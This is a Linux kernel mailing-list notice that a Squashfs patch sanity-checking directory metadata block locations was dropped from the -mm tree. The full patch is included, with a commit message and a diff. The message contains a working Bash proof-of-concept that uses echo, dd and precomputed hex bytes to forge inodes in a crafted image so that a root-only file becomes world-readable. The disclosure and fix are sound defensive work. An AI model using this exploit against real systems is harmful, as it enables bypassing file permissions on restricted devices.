Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=100.103.45.18
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1795406624;
	b=2zjLn3eqQWVcWiha8XOQXziz33ZIzWGSEvatHrxo7fDRyUB8an7ni0ZnhclmKEM4UYcI
	 Y23FHg4HNE8Hd3Vopew8Y9ZNe7PfvicTtDqv07Jlsluz8QE0OCwXvZxkGSeJ/o+ZKwe+3
	 qkYkMoCNm9o9HNCZ0TyMbzPEZjbeHVBrncnntU+nLeAQmD+xR/NIKJmvzP+PA8IVNuCZx
	 LKuqDJ5Io5oFKWm2QaBk+2xAzPKCTE9PBWFgHWby9hNNFvKO1wOLO15lMuaapB6oqj99U
	 JhzUafW82CwlQ0LHGibi5/trJbwXcPCNRFkCoenE5yGXx411xkY+f7QJXgMksnp0GCA==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1795406624;
	h=Received:DKIM-Signature:Date:To:From:In-Reply-To:References:Subject:
	 Message-Id;
	bh=4AbQzIXmudcsugIRiZT8oEzyfXCuU3sbfwQKvpBI7yk=;
	b=FQs7mmwM1t1iL6/DDp/nH9LbJJs/aJqBVrOxKQYxquQElxQCkVXxwQfvsKJn1CURfokE
	 +P4+C5qlD0p8NrB5j3QAOE7IFO2TNT8IUIVYQWn+YS+OnT8pR98AJ2/b2r8lq5dYy58tf
	 yvnJm9LYdjJmdqZrIh4wzTU8RDmQCiQfmwBfcJWHcnsCefWRSa2BPfkXNJx9lO+VWAg5F
	 9ZL0iBhsaqjRInjpP2gJJTj+w5qTEUI7kirQb409AyCIoBCY3+0eUSVKh0Nzg2TfE3vU8
	 jugU1ibN98cApzBhpKFB0CQjNZqSJ/DFIJ47/SXDUfRe6kZryMKVK8BWiAjEUYT/UUg==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dkim=pass header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=DuiqQkSg;
	arc=none smtp.remote-ip=100.103.45.18
Received: from smtp.kernel.org (quasi.space.kernel.org [100.103.45.18])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 2D964606A31E
	for <mm-commits@vger.kernel.org>; Mon, 23 Nov 2026 04:03:44 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=DuiqQkSg
Received: by smtp.kernel.org (Postfix) with ESMTPSA id CD1101F000D3;
	Mon, 23 Nov 2026 04:03:43 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
	d=linux-foundation.org; s=korg; t=1795406623;
	bh=4AbQzIXmudcsugIRiZT8oEzyfXCuU3sbfwQKvpBI7yk=;
	h=Date:To:From:In-Reply-To:References:Subject;
	b=DuiqQkSgO7193bPfeZoyWyoFt34cX5J04g2N0ox3eX4sy92YmE9nqyysBRf8aUVlU
	 4UnZ6qFw3CxLtVmhe4RkxZFtzdQRehkfjA/5jdabeC3MERQO2QWnnni9TmGBeREPEW
	 Ur1N7q4ky0mfj/QtUs3+kcDY28S9fCLdgqLhaaaY=
Date: Sun, 22 Nov 2026 20:03:43 -0800
To: mm-commits@vger.kernel.org,phillip@squashfs.org.uk,
	akpm@linux-foundation.org
From: Andrew Morton <akpm@linux-foundation.org>
In-Reply-To: <20261111234402.252354-12-phillip@squashfs.org.uk>
References: <20261111234402.252354-12-phillip@squashfs.org.uk>
Subject: [to-be-updated] squashfs-sanity-check-directory-metadata-block-location.patch removed from -mm tree
Message-Id: <20261123040343.CD1101F000D3@smtp.kernel.org>
X-Mailing-List: mm-commits@vger.kernel.org
List-Id: <mm-commits.vger.kernel.org>
List-Post: <mailto:mm-commits@vger.kernel.org>
List-Help: <mailto:mm-commits+help@vger.kernel.org>
List-Subscribe: <mailto:mm-commits+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:mm-commits+unsubscribe@vger.kernel.org>
List-Owner: <mailto:mm-commits+owner@vger.kernel.org>
Precedence: list


The quilt patch titled
     Subject: Squashfs: sanity check directory metadata block location
has been removed from the -mm tree.  Its filename was
     squashfs-sanity-check-directory-metadata-block-location.patch

This patch was dropped because an updated version will be issued

------------------------------------------------------
From: Phillip Lougher <phillip@squashfs.org.uk>
Subject: Squashfs: sanity check directory metadata block location
Date: Wed, 11 Nov 2026 23:43:51 +0000

The contents of directories are stored in compressed metadata blocks,
which are placed in the directory table.  The location of a directory
is thus represented as a tuple, the location of the compressed metadata
block that the directory is in, and the offset into the uncompressed
block.  The block location is not absolute, and it is instead encoded
as an offset from the start of the directory table.

An attacker could manipulate the directory block location to make it
point to a replacement malicious directory stored elsewhere, outside
the directory table.  This is because the code does not check that the
location is valid and is within the directory table.

In practice this exploit is hard to achieve because metadata in Squashfs
is compressed by default, and so the compressed metadata cannot be
directly altered.  In addition due to sanity checking at mount time
there are no gaps in the filesystem to store a malicious directory.

Also anyone with access to Mksquashfs/Unsquashfs can copy and recreate
the filesystem incorporating whatever changes they want.

However, there are a number of exploit scenarios here.  Many embedded
systems or secure systems have deliverately restricted installations
with only basic tools, and lack any Mksquashfs/Unsquashfs.  But exploits
due to this bug can be achieved with only echo and dd.

An example exploit is where a Squashfs filesystem has a file in the
root directory with permissions 0700 (u=rxw), where only the superuser
can read it.  But using this bug an attacker could create a malicious
replacement directory in the inode lookup table (used by NFS), that
points to a malicious replacement inode that has the permissions
changed to 0777 (a=wrx).  On reboot/remount this would make the
file readable by unpriviliged users.

The following shell script acts as a reproducer and proof of concept.

This commit blocks such attempts by adding a new helper
squashfs_dir_start() which adds additional sanity checking, first
ensuring no arithmetic operations overflow, and second checking that
the directory is within the directory table.

Reproducer
==========

The following Bash script uses echo and dd to achieve the previously
discussed exploit.  If the exploit is successful the file "data"
permissions will be changed to 0777 (a=rwx), but otherwise the
filesystem is unchanged.

===================================================================
#!/bin/bash

ARGS="-no-sparse -no-hardlinks -no-progress -quiet -inode-time 0 -mkfs-time 0"

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

# Create a Squashfs pseudo file which is fed to Mksquashfs
echo Create a Squashfs pseudo file which is fed to Mksquashfs

dd if=/dev/zero of=zero bs=1024 count=1 status=none
echo "data f 0700 0 0 echo some data" >> pseudo
echo "files d 0777 0 0" >> pseudo
for i in $(seq 1 100); do
	echo "files/$i f 0655 1000 1000 cat zero" >> pseudo
done

# Create a Squashfs filesystem
echo "Create a Squashfs filesystem"

if ! mksquashfs - img.sqsh -pf pseudo -p "/ d 0777 0 0" $ARGS; then
	echo Failed to create Squashfs filesystem
	finish
fi

# Exploit: The file named "data" has permissions 0700, which can only be
# read by the superuser.  The desire is to change the permissions on
# the file to be 0777, which can be read by unpriviliged users.
#
# Due to compression of the metadata, this cannot be done by directly
# writing to the metadata tables.  Instead the real metadata is replaced
# by malicious metadata starting from the "data" file inode upwards to
# the root inode.
#
# This is a three step process.
#
# 1. A new "data" file inode is placed within the inode lookup table
# 2. A new root directory which points to the new "data" file inode is
#    placed in the inode lookup table
# 3. A new root inode which pounts to the new root directory table is
#    placed in the inode lookup table.
#
# For brevity this reproducer uses pre-computed data for the above.

# Write malicious inode for file "data", this is the same as the
# original except it is uncompressed, and the permissions are set to
# 0777.
echo Writing malicious inode for file \"data\"

/usr/bin/echo -en "\x20\x80\x02\x00\xFF\x01\x00\x00\x00\x00\x00\x00\
\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
\x00\x0A\x00\x00\x00" > file

dd bs=1 seek=1034 if=file of=img.sqsh count=34 conv=notrunc status=none

# Write directory data which points to the malicious inode
echo Writing root directory which points to malicious inode

/usr/bin/echo -en "\x31\x80\x00\x00\x00\x00\x90\x03\x00\x00\x01\x00\x00\
\x00\x00\x00\x00\x00\x02\x00\x03\x00\x64\x61\x74\x61\x00\x00\x00\x00\
\x00\x00\x00\x00\x02\x00\x00\x00\xA0\x0C\x00\x00\x01\x00\x04\x00\x66\
\x69\x6c\x65\x73" > file

dd bs=1 seek=983 if=file of=img.sqsh count=51 conv=notrunc status=none

#
# Write root inode, this is the same as the original root inode, except
# it is uncompressed, and it points to the new directory data
echo Writing root inode which points to the new root directory

/usr/bin/echo -en "\x20\x80\x01\x00\xFF\x01\x00\x00\x00\x00\x00\x00\
\x00\x00\x67\x00\x00\x00\x43\x02\x00\x00\x03\x00\x00\x00\x34\x00\x00\
\x00\x00\x00\x00\x00" > file

dd bs=1 seek=949 if=file of=img.sqsh count=34 conv=notrunc status=none

# Update the root_inode field in the superblock to point to our new
# root inode.  The start block is an offset from the inode_table_start,
# and not an absolute value.  The start of the inode table is 122, the
# new inode is placed at position 949, and so the offset is 827. Because
# we've only stored one inode in the metadata block, the offset into
# that block is 0.
echo Updating the root_inode field in the superblock

/usr/bin/echo -en "\x00\x00\x3B\x03" > file

dd bs=1 seek=32 if=file of=img.sqsh count=4 conv=notrunc status=none

# Mount the filesystem to /mnt
echo Mount the filesystem to /mnt

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

# Stat /mnt/data, if the exploit is successful, permissions should be 0777
echo "************************************************************************"
echo Stat /mnt/data, if the exploit is successful, permissions should be 0777

stat /mnt/data

popd 2>&1> /dev/null

rm -rf $DIR
=====================================================================

Link: https://patch.msgid.link/20261111234402.252354-12-phillip@squashfs.org.uk
Fixes: c88da2c97936 ("Squashfs: directory lookup operations")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
Cc: Phillip Lougher <phillip.lougher@gmail.com>

 fs/squashfs/dir.c              |   20 ++++++++++++++------
 fs/squashfs/namei.c            |   20 +++++++++++++-------
 fs/squashfs/squashfs_fs_sb.h   |    1 +
 fs/squashfs/squashfs_helpers.h |   17 +++++++++++++++++
 fs/squashfs/super.c            |    1 +
 5 files changed, 46 insertions(+), 13 deletions(-)

--- a/fs/squashfs/dir.c~squashfs-sanity-check-directory-metadata-block-location
+++ a/fs/squashfs/dir.c
@@ -22,6 +22,7 @@
 #include "squashfs_fs.h"
 #include "squashfs_fs_sb.h"
 #include "squashfs_fs_i.h"
+#include "squashfs_helpers.h"
 #include "squashfs.h"
 
 static const unsigned char squashfs_filetype_table[] = {
@@ -41,6 +42,7 @@ static int get_dir_index_using_offset(st
 	int i_count, u64 f_pos)
 {
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
+	s64 res;
 	int err, i, index, length = 0;
 	unsigned int size;
 	struct squashfs_dir_index dir_index;
@@ -81,9 +83,12 @@ static int get_dir_index_using_offset(st
 		if (err < 0)
 			break;
 
+		res = squashfs_dir_start(le32_to_cpu(dir_index.start_block), msblk);
+		if (res < 0)
+			break;
+
 		length = index;
-		*next_block = le32_to_cpu(dir_index.start_block) +
-					msblk->directory_table;
+		*next_block = res;
 	}
 
 	*next_offset = (length + *next_offset) % SQUASHFS_METADATA_SIZE;
@@ -99,13 +104,16 @@ static int squashfs_readdir(struct file
 {
 	struct inode *inode = file_inode(file);
 	struct squashfs_sb_info *msblk = inode->i_sb->s_fs_info;
-	u64 block = squashfs_i(inode)->start + msblk->directory_table;
+	s64 block = squashfs_dir_start(squashfs_i(inode)->start, msblk);
 	int offset = squashfs_i(inode)->offset, length, err;
 	unsigned int inode_number, dir_count, size, type;
 	struct squashfs_dir_header dirh;
-	struct squashfs_dir_entry *dire;
+	struct squashfs_dir_entry *dire = NULL;
+
+	TRACE("Entered squashfs_readdir [%llx:%x]\n", squashfs_i(inode)->start, offset);
 
-	TRACE("Entered squashfs_readdir [%llx:%x]\n", block, offset);
+	if (block < 0)
+		goto failed_read;
 
 	dire = kmalloc(sizeof(*dire) + SQUASHFS_NAME_LEN + 1, GFP_KERNEL);
 	if (dire == NULL) {
@@ -211,7 +219,7 @@ finish:
 	return 0;
 
 failed_read:
-	ERROR("Unable to read directory block [%llx:%x]\n", block, offset);
+	ERROR("Unable to read directory block [%llx:%x]\n", squashfs_i(inode)->start, offset);
 	kfree(dire);
 	return 0;
 }
--- a/fs/squashfs/namei.c~squashfs-sanity-check-directory-metadata-block-location
+++ a/fs/squashfs/namei.c
@@ -66,6 +66,7 @@ static int get_dir_index_using_name(stru
 			int index_offset, int i_count, const char *name)
 {
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
+	s64 res;
 	int i, length = 0, err;
 	unsigned int size;
 	struct squashfs_dir_index *index;
@@ -99,9 +100,12 @@ static int get_dir_index_using_name(stru
 		if (strcmp(index->name, name) > 0)
 			break;
 
+		res = squashfs_dir_start(le32_to_cpu(index->start_block), msblk);
+		if (res < 0)
+			break;
+
 		length = le32_to_cpu(index->index);
-		*next_block = le32_to_cpu(index->start_block) +
-					msblk->directory_table;
+		*next_block = res;
 	}
 
 	*next_offset = (length + *next_offset) % SQUASHFS_METADATA_SIZE;
@@ -126,13 +130,16 @@ static struct dentry *squashfs_lookup(st
 	struct inode *inode = NULL;
 	struct squashfs_sb_info *msblk = dir->i_sb->s_fs_info;
 	struct squashfs_dir_header dirh;
-	struct squashfs_dir_entry *dire;
-	u64 block = squashfs_i(dir)->start + msblk->directory_table;
+	struct squashfs_dir_entry *dire = NULL;
+	u64 block = squashfs_dir_start(squashfs_i(dir)->start, msblk);
 	int offset = squashfs_i(dir)->offset;
 	int err, length;
 	unsigned int dir_count, size;
 
-	TRACE("Entered squashfs_lookup [%llx:%x]\n", block, offset);
+	TRACE("Entered squashfs_lookup [%llx:%x]\n", squashfs_i(dir)->start, offset);
+
+	if (block < 0)
+		goto data_error;
 
 	dire = kmalloc(sizeof(*dire) + SQUASHFS_NAME_LEN + 1, GFP_KERNEL);
 	if (dire == NULL) {
@@ -219,8 +226,7 @@ data_error:
 
 read_failure:
 	ERROR("Unable to read directory block [%llx:%x]\n",
-		squashfs_i(dir)->start + msblk->directory_table,
-		squashfs_i(dir)->offset);
+		squashfs_i(dir)->start, squashfs_i(dir)->offset);
 failed:
 	kfree(dire);
 	return ERR_PTR(err);
--- a/fs/squashfs/squashfs_fs_sb.h~squashfs-sanity-check-directory-metadata-block-location
+++ a/fs/squashfs/squashfs_fs_sb.h
@@ -67,6 +67,7 @@ struct squashfs_sb_info {
 	__le64					*inode_lookup_table;
 	u64					inode_table;
 	u64					directory_table;
+	u64					directory_table_end;
 	u64					xattr_table;
 	unsigned int				block_size;
 	unsigned short				block_log;
--- a/fs/squashfs/squashfs_helpers.h~squashfs-sanity-check-directory-metadata-block-location
+++ a/fs/squashfs/squashfs_helpers.h
@@ -70,6 +70,23 @@ static inline s64 squashfs_mkinode(u32 s
 	return ((s64)start << 16) | offset;
 }
 
+/* directory helper functions */
+static inline s64 squashfs_dir_start(u32 blk, struct squashfs_sb_info *msblk)
+{
+	s64 start;
+
+	if (S64_MAX - msblk->directory_table < blk)
+		return -EINVAL;
+
+	start = msblk->directory_table + blk;
+
+	if (msblk->directory_table < msblk->directory_table_end &&
+				start >= msblk->directory_table_end)
+		return -EINVAL;
+
+	return start;
+}
+
 /* fragment and fragment table defines */
 static inline s64 squashfs_fragment_bytes(u32 fragments)
 {
--- a/fs/squashfs/super.c~squashfs-sanity-check-directory-metadata-block-location
+++ a/fs/squashfs/super.c
@@ -437,6 +437,7 @@ check_directory_table:
 		err = -EINVAL;
 		goto insanity;
 	}
+	msblk->directory_table_end = next_table;
 
 	/* Sanity check inode_table */
 	if (msblk->inode_table >= msblk->directory_table) {
_

Patches currently in -mm which might be from phillip@squashfs.org.uk are

squashfs-widen-xattr-count-variables-and-add-sanity-check.patch
squashfs-very-large-files-can-exceed-an-int-block-count.patch
squashfs-add-more-sanity-checking-to-squashfs_block_size.patch
squashfs-sanity-check-fragment-block-location-and-range.patch
squashfs-sanity-check-block-list-sizes-and-range.patch
squashfs-dont-store-large-export-table-indexes-in-memory.patch
squashfs-dont-store-large-fragment-table-indexes-in-memory.patch
squashfs-dont-store-large-xattr-id-table-indexes-in-memory.patch
squashfs-fix-variables-in-directory-code-and-add-more-sanity-checks.patch
squashfs-fix-regression-in-squashfs_copy_cache.patch
squashfs-check-index-isnt-greater-than-s64_max-in-squashfs_read_data.patch
a.patch

